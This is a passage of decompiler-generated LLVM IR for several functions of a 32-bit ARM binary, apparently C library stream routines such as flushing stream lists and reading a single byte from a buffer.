  store i32 %v4_15460, i32* %r3.global-to-local, align 4
  %v0_15464 = load i32, i32* %r4.global-to-local, align 4
  %v2_15464 = inttoptr i32 %v4_15460 to i32*
  store i32 %v0_15464, i32* %v2_15464, align 4
  %v0_1546c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15468

dec_label_pc_15468:                               ; preds = %dec_label_pc_15344, %dec_label_pc_153a8, %dec_label_pc_15444
  %v0_1546c = phi i32 [ %v0_15398, %dec_label_pc_15344 ], [ %v0_15398, %dec_label_pc_153a8 ], [ %v0_1546c.pre, %dec_label_pc_15444 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1546c = add i32 %v0_1546c, 12
  %v3_1546c = inttoptr i32 %v2_1546c to i32*
  %v4_1546c = load i32, i32* %v3_1546c, align 4
  %v1_15470 = inttoptr i32 %v4_1546c to i32*
  %v2_15470 = load i32, i32* %v1_15470, align 4
  %v1_15474 = add i32 %v2_15470, -1
  store i32 %v1_15474, i32* %v1_15470, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_15488 = load i32, i32* %r6.global-to-local, align 4
  %v2_15488 = add i32 %v0_15488, 24
  %v3_15488 = inttoptr i32 %v2_15488 to i32*
  %v4_15488 = load i32, i32* %v3_15488, align 4
  call void @__pseudo_branch(i32 %v4_15488)
  %v2_15498 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15498, i32* %r4.global-to-local, align 4
  ret i32 %v2_15374

; uselistorder directives
  uselistorder i32 %v0_15434, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* inttoptr (i32 127028 to i32*), { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15468, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15434, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_153fc, { 1, 0 }
}

define i32 @function_154a4(i16* %arg1) local_unnamed_addr {
dec_label_pc_154a4:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_154a4 = load i1, i1* @cpsr_z, align 1
  %v2_154a4 = load i32, i32* @r4, align 4
  br i1 %v0_154a4, label %bb, label %dec_label_pc_154a4..thread8_crit_edge

dec_label_pc_154a4..thread8_crit_edge:            ; preds = %dec_label_pc_154a4
  %v0_154e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_154a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_154a4..thread8_crit_edge, %bb
  %v0_15680 = phi i32 [ %v0_154e0.pre, %dec_label_pc_154a4..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_154a4, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %sb.global-to-local, align 4
  %v4_154dc = load i32, i32* inttoptr (i32 127036 to i32*), align 4
  store i32 %v4_154dc, i32* %r3.global-to-local, align 4
  %v9_154e0 = icmp eq i32 %v0_15680, %v4_154dc
  store i32 %v0_15680, i32* %fp.global-to-local, align 4
  br i1 %v9_154e0, label %bb49, label %dec_label_pc_154f8

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15508

dec_label_pc_154f8:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_154fc = icmp eq i32 %v0_15680, 0
  br i1 %v2_154fc, label %dec_label_pc_15508, label %dec_label_pc_15670

dec_label_pc_15508:                               ; preds = %bb49, %dec_label_pc_154f8
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_154f8 ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_1551c = load i32, i32* inttoptr (i32 127100 to i32*), align 4
  store i32 %v4_1551c, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_15524 = ptrtoint i32* %stack_var_-56 to i32
  %v4_15528 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  store i32 %v4_1551c, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15528)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15548 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15548, i32* %r0.global-to-local, align 4
  %v0_1554c = load i32, i32* %sb.global-to-local, align 4
  %v2_1554c = add i32 %v0_1554c, 16
  %v3_1554c = inttoptr i32 %v2_1554c to i32*
  %v4_1554c = load i32, i32* %v3_1554c, align 4
  call void @__pseudo_branch(i32 %v4_1554c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1555c = add i32 %v0_1554c, 12
  %v3_1555c = inttoptr i32 %v2_1555c to i32*
  %v4_1555c = load i32, i32* %v3_1555c, align 4
  store i32 %v4_1555c, i32* %r2.global-to-local, align 4
  %v1_15560 = inttoptr i32 %v4_1555c to i32*
  %v2_15560 = load i32, i32* %v1_15560, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_15568 = add i32 %v2_15560, 1
  store i32 %v1_15568, i32* %r3.global-to-local, align 4
  %v2_1556c = add i32 %v0_1554c, 24
  %v3_1556c = inttoptr i32 %v2_1556c to i32*
  %v4_1556c = load i32, i32* %v3_1556c, align 4
  store i32 %v1_15568, i32* %v1_15560, align 4
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1556c)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_15588 = load i32, i32* %sb.global-to-local, align 4
  %v2_15588 = add i32 %v0_15588, 96
  %v3_15588 = inttoptr i32 %v2_15588 to i32*
  %v4_15588 = load i32, i32* %v3_15588, align 4
  store i32 %v4_15588, i32* @r4, align 4
  store i32 %v4_15588, i32* %r2.global-to-local, align 4
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15528)
  %v0_155a0 = load i32, i32* @r4, align 4
  store i32 %v0_155a0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1554c)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_155b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_155b0 = add i32 %v0_155b0, 44
  %v3_155b0 = inttoptr i32 %v2_155b0 to i32*
  %v4_155b0 = load i32, i32* %v3_155b0, align 4
  store i32 %v4_155b0, i32* %r3.global-to-local, align 4
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  %v1_155bc = inttoptr i32 %v4_155b0 to i32*
  %v2_155bc = load i32, i32* %v1_155bc, align 4
  store i32 %v2_155bc, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_1556c)
  %v0_155c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_155c8, i32* @r6, align 4
  %v2_155cc = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_155cc, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_15660.pr = load i32, i32* @r7, align 4
  %v2_1566028 = icmp eq i32 %v0_15660.pr, 0
  br i1 %v2_1566028, label %dec_label_pc_15668, label %dec_label_pc_155d4

dec_label_pc_155d4:                               ; preds = %dec_label_pc_15508, %dec_label_pc_1565c
  %v0_155e0 = phi i32 [ %v3_1565c, %dec_label_pc_1565c ], [ %v0_15660.pr, %dec_label_pc_15508 ]
  %v1_155d4 = inttoptr i32 %v0_155e0 to i16*
  %v2_155d4 = load i16, i16* %v1_155d4, align 2
  %v3_155d4 = zext i16 %v2_155d4 to i32
  store i32 %v3_155d4, i32* %r3.global-to-local, align 4
  %v1_155d8 = and i32 %v3_155d4, 64
  %v2_155d8 = icmp eq i32 %v1_155d8, 0
  br i1 %v2_155d8, label %dec_label_pc_1565c, label %dec_label_pc_155e0

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155d4
  %v1_155e0 = add i32 %v0_155e0, 56
  store i32 %v1_155e0, i32* @r4, align 4
  store i32 %v1_155e0, i32* %r2.global-to-local, align 4
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  %v0_155f0 = load i32, i32* %sb.global-to-local, align 4
  %v1_155f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_155f0 = add i32 %v1_155f0, %v0_155f0
  %v3_155f0 = inttoptr i32 %v2_155f0 to i32*
  %v4_155f0 = load i32, i32* %v3_155f0, align 4
  call void @__pseudo_branch(i32 %v4_155f0)
  %v0_155fc = load i32, i32* @r4, align 4
  store i32 %v0_155fc, i32* %r0.global-to-local, align 4
  %v0_15600 = load i32, i32* %sb.global-to-local, align 4
  %v1_15600 = load i32, i32* @r8, align 4
  %v2_15600 = add i32 %v1_15600, %v0_15600
  %v3_15600 = inttoptr i32 %v2_15600 to i32*
  %v4_15600 = load i32, i32* %v3_15600, align 4
  call void @__pseudo_branch(i32 %v4_15600)
  %v0_1560c = load i32, i32* @r7, align 4
  %v1_1560c = inttoptr i32 %v0_1560c to i16*
  %v2_1560c = load i16, i16* %v1_1560c, align 2
  %v3_1560c = zext i16 %v2_1560c to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_15614 = or i32 %v3_1560c, %stack_var_-60.1.in
  %v1_15618 = xor i32 %v2_15614, 320
  store i32 %v1_15618, i32* %r3.global-to-local, align 4
  %v1_1561c = and i32 %v1_15618, 832
  %v2_1561c = icmp eq i32 %v1_1561c, 0
  br i1 %v2_1561c, label %dec_label_pc_15624, label %bb50

dec_label_pc_15624:                               ; preds = %dec_label_pc_155e0
  store i32 %v0_1560c, i32* %r0.global-to-local, align 4
  %v1_15628 = call i32 @function_1517c(i32 %v0_1560c)
  store i32 %v1_15628, i32* %r0.global-to-local, align 4
  %v2_1562c = icmp eq i32 %v1_15628, 0
  br i1 %v2_1562c, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_15624
  %v1_15630 = load i32, i32* @r7, align 4
  %v2_15630 = inttoptr i32 %v1_15630 to i16*
  %v3_15630 = load i16, i16* %v2_15630, align 2
  %v4_15630 = zext i16 %v3_15630 to i32
  store i32 %v4_15630, i32* %r3.global-to-local, align 4
  %v2_15634 = add i32 %v1_15630, 8
  %v3_15634 = inttoptr i32 %v2_15634 to i32*
  %v4_15634 = load i32, i32* %v3_15634, align 4
  store i32 %v4_15634, i32* %r2.global-to-local, align 4
  %v2_15638 = and i32 %v4_15630, 65471
  store i32 %v2_15638, i32* %r3.global-to-local, align 4
  %v3_1563c = add i32 %v1_15630, 28
  %v4_1563c = inttoptr i32 %v3_1563c to i32*
  store i32 %v4_15634, i32* %v4_1563c, align 4
  %v1_15640 = load i32, i32* %r3.global-to-local, align 4
  %v2_15640 = trunc i32 %v1_15640 to i16
  %v3_15640 = load i32, i32* @r7, align 4
  %v4_15640 = inttoptr i32 %v3_15640 to i16*
  store i16 %v2_15640, i16* %v4_15640, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_15624
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_155e0, %.thread17
  store i32 %v2_15524, i32* %r0.global-to-local, align 4
  %v0_15650 = load i32, i32* %sb.global-to-local, align 4
  %v1_15650 = load i32, i32* %sl.global-to-local, align 4
  %v2_15650 = add i32 %v1_15650, %v0_15650
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  %v4_15650 = load i32, i32* %v3_15650, align 4
  call void @__pseudo_branch(i32 %v4_15650)
  %v0_1565c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1565c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_155d4, %bb50
  %v0_1565c = phi i32 [ %v0_155e0, %dec_label_pc_155d4 ], [ %v0_1565c.pre, %bb50 ]
  %v1_1565c = add i32 %v0_1565c, 32
  %v2_1565c = inttoptr i32 %v1_1565c to i32*
  %v3_1565c = load i32, i32* %v2_1565c, align 4
  store i32 %v3_1565c, i32* @r7, align 4
  %v2_15660 = icmp eq i32 %v3_1565c, 0
  br i1 %v2_15660, label %dec_label_pc_15668, label %dec_label_pc_155d4

dec_label_pc_15668:                               ; preds = %dec_label_pc_1565c, %dec_label_pc_15508
  %v0_15668 = call i32 @function_15344()
  store i32 %v0_15668, i32* %r0.global-to-local, align 4
  %v0_156a4.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_15670:                               ; preds = %dec_label_pc_154f8
  %v1_15670 = inttoptr i32 %v0_15680 to i16*
  %v2_15670 = load i16, i16* %v1_15670, align 2
  %v3_15670 = zext i16 %v2_15670 to i32
  %v1_15674 = and i32 %v3_15670, 64
  store i32 %v1_15674, i32* %r3.global-to-local, align 4
  %v2_15674 = icmp eq i32 %v1_15674, 0
  br i1 %v2_15674, label %bb51, label %dec_label_pc_15680

bb51:                                             ; preds = %dec_label_pc_15670
  br label %bb52

dec_label_pc_15680:                               ; preds = %dec_label_pc_15670
  %v1_15680 = call i32 @function_1517c(i32 %v0_15680)
  store i32 %v1_15680, i32* %r0.global-to-local, align 4
  %v2_15684 = icmp eq i32 %v1_15680, 0
  br i1 %v2_15684, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_15680
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_15680
  %v1_15688 = load i32, i32* %fp.global-to-local, align 4
  %v2_15688 = inttoptr i32 %v1_15688 to i16*
  %v3_15688 = load i16, i16* %v2_15688, align 2
  %v4_15688 = zext i16 %v3_15688 to i32
  store i32 %v4_15688, i32* %r3.global-to-local, align 4
  %v2_1568c = add i32 %v1_15688, 8
  %v3_1568c = inttoptr i32 %v2_1568c to i32*
  %v4_1568c = load i32, i32* %v3_1568c, align 4
  store i32 %v4_1568c, i32* %r2.global-to-local, align 4
  %v2_15690 = and i32 %v4_15688, 65471
  store i32 %v2_15690, i32* %r3.global-to-local, align 4
  %v2_15694 = trunc i32 %v2_15690 to i16
  store i16 %v2_15694, i16* %v2_15688, align 2
  %v1_15698 = load i32, i32* %r2.global-to-local, align 4
  %v2_15698 = load i32, i32* %fp.global-to-local, align 4
  %v3_15698 = add i32 %v2_15698, 28
  %v4_15698 = inttoptr i32 %v3_15698 to i32*
  store i32 %v1_15698, i32* %v4_15698, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_15668, %.thread24
  %v0_156a4 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_156a4.pre, %dec_label_pc_15668 ], [ 0, %.thread24 ]
  store i32 %v0_156a4, i32* %r0.global-to-local, align 4
  %v2_156ac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_156ac, i32* %r4.global-to-local, align 4
  ret i32 %v0_156a4

; uselistorder directives
  uselistorder i32 %v0_156a4, { 1, 0 }
  uselistorder i32 %v3_1565c, { 1, 2, 0 }
  uselistorder i32 %v0_1560c, { 1, 0, 2 }
  uselistorder i32 %v0_1554c, { 1, 0, 2 }
  uselistorder i32 %v0_15680, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_15344, { 1, 0 }
  uselistorder i32 56, { 9, 10, 11, 2, 3, 12, 14, 5, 6, 7, 8, 1, 4, 13, 0, 15 }
  uselistorder i32* @r8, { 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 230, 184, 185, 4, 186, 187, 188, 212, 213, 214, 215, 216, 10, 217, 218, 219, 220, 221, 222, 223, 224, 89, 90, 91, 92, 93, 41, 42, 43, 44, 45, 46, 47, 34, 35, 24, 21, 5, 22, 1, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 48, 49, 50, 51, 6, 71, 0, 72, 73, 74, 11, 75, 40, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 76, 77, 78, 79, 80, 81, 7, 82, 83, 84, 85, 86, 87, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 152, 8, 153, 154, 155, 156, 157, 158, 159, 160, 9, 161, 162, 163, 164, 165, 166, 2, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 225, 226, 227, 228, 229, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 147, 148, 149, 150, 151 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32* inttoptr (i32 127064 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1565c, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_155d4, { 1, 0 }
  uselistorder label %dec_label_pc_15508, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_156b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_156b8:
  %v0_156b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_156b8, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_156b8
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_156b8, %bb
  %v5_156d4 = phi i32 [ %arg1, %dec_label_pc_156b8 ], [ 0, %bb ]
  ret i32 %v5_156d4

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_156d8(i16* %arg1) local_unnamed_addr {
dec_label_pc_156d8:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_156d8 = load i32, i32* @r4, align 4
  store i32 %v3_156d8, i32* %stack_var_-12, align 4
  %v6_156d8 = load i32, i32* @r5, align 4
  %v9_156d8 = load i32, i32* @lr, align 4
  %v0_156dc = load i32, i32* @r0, align 4
  %v1_156dc = add i32 %v0_156dc, 16
  %v2_156dc = inttoptr i32 %v1_156dc to i32*
  %v3_156dc = load i32, i32* %v2_156dc, align 4
  store i32 %v3_156dc, i32* %r2.global-to-local, align 4
  %v1_156e0 = add i32 %v0_156dc, 24
  %v2_156e0 = inttoptr i32 %v1_156e0 to i32*
  %v3_156e0 = load i32, i32* %v2_156e0, align 4
  %v3_156e4 = icmp ult i32 %v3_156dc, %v3_156e0
  store i32 %v0_156dc, i32* @r4, align 4
  br i1 %v3_156e4, label %bb, label %dec_label_pc_15704

bb:                                               ; preds = %dec_label_pc_156d8
  %v2_156f0 = inttoptr i32 %v3_156dc to i8*
  %v3_156f0 = load i8, i8* %v2_156f0, align 1
  %v4_156f0 = zext i8 %v3_156f0 to i32
  store i32 %v4_156f0, i32* %r0.global-to-local, align 4
  %v6_156f0 = add i32 %v3_156dc, 1
  store i32 %v6_156f0, i32* %r2.global-to-local, align 4
  store i32 %v6_156f0, i32* %v2_156dc, align 4
  br label %dec_label_pc_157f0

dec_label_pc_15704:                               ; preds = %dec_label_pc_156d8
  store i32 126992, i32* @r5, align 4
  %v1_15704 = inttoptr i32 %v0_156dc to i16*
  %v2_15704 = load i16, i16* %v1_15704, align 2
  %v3_15704 = zext i16 %v2_15704 to i32
  %v1_15708 = and i32 %v3_15704, 131
  %tmp24 = icmp ugt i32 %v1_15708, 128
  br i1 %tmp24, label %dec_label_pc_15724, label %dec_label_pc_15714

dec_label_pc_15714:                               ; preds = %dec_label_pc_15704
  store i32 128, i32* @r1, align 4
  %v0_15718 = call i32 @function_1654c()
  store i32 %v0_15718, i32* %r0.global-to-local, align 4
  %v2_1571c = icmp eq i32 %v0_15718, 0
  br i1 %v2_1571c, label %dec_label_pc_15714.dec_label_pc_15724_crit_edge, label %dec_label_pc_157ec

dec_label_pc_15714.dec_label_pc_15724_crit_edge:  ; preds = %dec_label_pc_15714
  %v0_15724.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15724

dec_label_pc_15724:                               ; preds = %dec_label_pc_15714.dec_label_pc_15724_crit_edge, %dec_label_pc_15704
  %v2_15764 = phi i32 [ %v0_15724.pre, %dec_label_pc_15714.dec_label_pc_15724_crit_edge ], [ %v0_156dc, %dec_label_pc_15704 ]
  %v1_15724 = inttoptr i32 %v2_15764 to i16*
  %v2_15724 = load i16, i16* %v1_15724, align 2
  %v3_15724 = zext i16 %v2_15724 to i32
  store i32 %v3_15724, i32* %r2.global-to-local, align 4
  %v1_15728 = and i32 %v3_15724, 2
  %v2_15728 = icmp eq i32 %v1_15728, 0
  br i1 %v2_15728, label %dec_label_pc_15754, label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %dec_label_pc_15724
  %tmp25 = urem i16 %v2_15724, 2
  %v1_15730 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_15730
  %v4_15734 = and i32 %tmp21, 4
  %v5_15734 = add i32 %v4_15734, %v2_15764
  %v1_15738 = add i32 %v5_15734, 36
  %v2_15738 = inttoptr i32 %v1_15738 to i8*
  %v3_15738 = load i8, i8* %v2_15738, align 1
  %v4_15738 = zext i8 %v3_15738 to i32
  %v1_1573c = add nsw i32 %v3_15724, -1
  store i32 %v1_1573c, i32* %r2.global-to-local, align 4
  store i32 %v4_15738, i32* %r0.global-to-local, align 4
  %v2_15748 = add i32 %v2_15764, 40
  %v3_15748 = inttoptr i32 %v2_15748 to i32*
  store i32 0, i32* %v3_15748, align 4
  %v0_1574c = load i32, i32* %r2.global-to-local, align 4
  %v1_1574c = trunc i32 %v0_1574c to i16
  %v2_1574c = load i32, i32* @r4, align 4
  %v3_1574c = inttoptr i32 %v2_1574c to i16*
  store i16 %v1_1574c, i16* %v3_1574c, align 2
  br label %dec_label_pc_157f0

dec_label_pc_15754:                               ; preds = %dec_label_pc_15724
  %v1_15754 = add i32 %v2_15764, 16
  %v1_15758 = inttoptr i32 %v1_15754 to i32*
  %v2_15758 = load i32, i32* %v1_15758, align 4
  %v3_15758 = add i32 %v2_15764, 20
  %v4_15758 = inttoptr i32 %v3_15758 to i32*
  %v5_15758 = load i32, i32* %v4_15758, align 4
  %v9_1575c = icmp eq i32 %v5_15758, %v2_15758
  br i1 %v9_1575c, label %dec_label_pc_1576c, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15754
  %v2_15760 = inttoptr i32 %v2_15758 to i8*
  %v3_15760 = load i8, i8* %v2_15760, align 1
  %v4_15760 = zext i8 %v3_15760 to i32
  store i32 %v4_15760, i32* %r0.global-to-local, align 4
  %v6_15760 = add i32 %v2_15758, 1
  store i32 %v6_15760, i32* %v1_15758, align 4
  br label %dec_label_pc_157f0

dec_label_pc_1576c:                               ; preds = %dec_label_pc_15754
  %v1_1576c = add i32 %v2_15764, 4
  %v2_1576c = inttoptr i32 %v1_1576c to i32*
  %v3_1576c = load i32, i32* %v2_1576c, align 4
  %v7_15770 = icmp eq i32 %v3_1576c, -2
  br i1 %v7_15770, label %.thread8, label %dec_label_pc_15784

.thread8:                                         ; preds = %dec_label_pc_1576c
  %v2_15774 = or i16 %v2_15724, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_15774, i16* %v1_15724, align 2
  br label %dec_label_pc_157f0

dec_label_pc_15784:                               ; preds = %dec_label_pc_1576c
  %v1_15784 = and i32 %v3_15724, 768
  %v2_15784 = icmp eq i32 %v1_15784, 0
  br i1 %v2_15784, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_15784
  %v1_1578c = load i32, i32* @r5, align 4
  %v3_1578c = add i32 %v1_1578c, 44
  %v4_1578c = inttoptr i32 %v3_1578c to i32*
  %v5_1578c = load i32, i32* %v4_1578c, align 4
  store i32 %v5_1578c, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15784, %bb22
  %v1_15790 = xor i1 %v2_15784, true
  call void @__pseudo_cond_branch(i1 %v1_15790, i32 ptrtoint (i32* @global_var_154cc.495 to i32))
  %v0_15794 = load i32, i32* @r4, align 4
  %v1_15794 = add i32 %v0_15794, 8
  store i32 %v1_15794, i32* %r2.global-to-local, align 4
  %v1_15798 = inttoptr i32 %v1_15794 to i32*
  %v2_15798 = load i32, i32* %v1_15798, align 4
  store i32 %v2_15798, i32* %r2.global-to-local, align 4
  %v3_15798 = add i32 %v0_15794, 12
  %v4_15798 = inttoptr i32 %v3_15798 to i32*
  %v5_15798 = load i32, i32* %v4_15798, align 4
  %v9_1579c = icmp eq i32 %v5_15798, %v2_15798
  br i1 %v9_1579c, label %dec_label_pc_157d0, label %dec_label_pc_157a4

dec_label_pc_157a4:                               ; preds = %.thread10
  %v2_157a4 = add i32 %v0_15794, 24
  %v3_157a4 = inttoptr i32 %v2_157a4 to i32*
  store i32 %v2_15798, i32* %v3_157a4, align 4
  %v0_157a8 = load i32, i32* @r4, align 4
  store i32 %v0_157a8, i32* %r0.global-to-local, align 4
  %v2_157ac = call i32 @function_1651c(i32 %v0_157a8)
  store i32 %v2_157ac, i32* %r0.global-to-local, align 4
  %v2_157b0 = icmp eq i32 %v2_157ac, 0
  br i1 %v2_157b0, label %dec_label_pc_157ec, label %dec_label_pc_157b8

dec_label_pc_157b8:                               ; preds = %dec_label_pc_157a4
  %v0_157b8 = load i32, i32* @r4, align 4
  %v1_157b8 = add i32 %v0_157b8, 20
  %v2_157b8 = inttoptr i32 %v1_157b8 to i32*
  %v3_157b8 = load i32, i32* %v2_157b8, align 4
  %v2_157bc = add i32 %v0_157b8, 24
  %v3_157bc = inttoptr i32 %v2_157bc to i32*
  store i32 %v3_157b8, i32* %v3_157bc, align 4
  %v0_157c0 = load i32, i32* @r4, align 4
  %v1_157c0 = add i32 %v0_157c0, 16
  %v2_157c0 = inttoptr i32 %v1_157c0 to i32*
  %v3_157c0 = load i32, i32* %v2_157c0, align 4
  %v1_157c4 = inttoptr i32 %v3_157c0 to i8*
  %v2_157c4 = load i8, i8* %v1_157c4, align 1
  %v3_157c4 = zext i8 %v2_157c4 to i32
  store i32 %v3_157c4, i32* %r0.global-to-local, align 4
  %v5_157c4 = add i32 %v3_157c0, 1
  store i32 %v5_157c4, i32* %v2_157c0, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157d0:                               ; preds = %.thread10
  %v1_157d0 = inttoptr i32 %v0_15794 to i16*
  store i32 %v0_15794, i32* %r0.global-to-local, align 4
  %v2_157d4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_157dc = call i32 @function_16410(i16* %v1_157d0, i32 %v2_157d4, i32 1)
  store i32 %v5_157dc, i32* %r0.global-to-local, align 4
  %v2_157e0 = icmp eq i32 %v5_157dc, 0
  br i1 %v2_157e0, label %dec_label_pc_157ec, label %bb23

bb23:                                             ; preds = %dec_label_pc_157d0
  %v4_157e4 = load i8, i8* %stack_var_-17, align 1
  %v5_157e4 = sext i8 %v4_157e4 to i32
  store i32 %v5_157e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157ec:                               ; preds = %dec_label_pc_157d0, %dec_label_pc_15714, %dec_label_pc_157a4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157f0:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_157b8, %dec_label_pc_15730, %dec_label_pc_157ec
  %v2_157f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157f4, i32* @r4, align 4
  store i32 %v6_156d8, i32* @r5, align 4
  store i32 %v9_156d8, i32* @lr, align 4
  %v1_157f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_157f8

; uselistorder directives
  uselistorder i32 %v2_15758, { 1, 0, 2 }
  uselistorder i32 %v2_15764, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_156dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_156dc, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
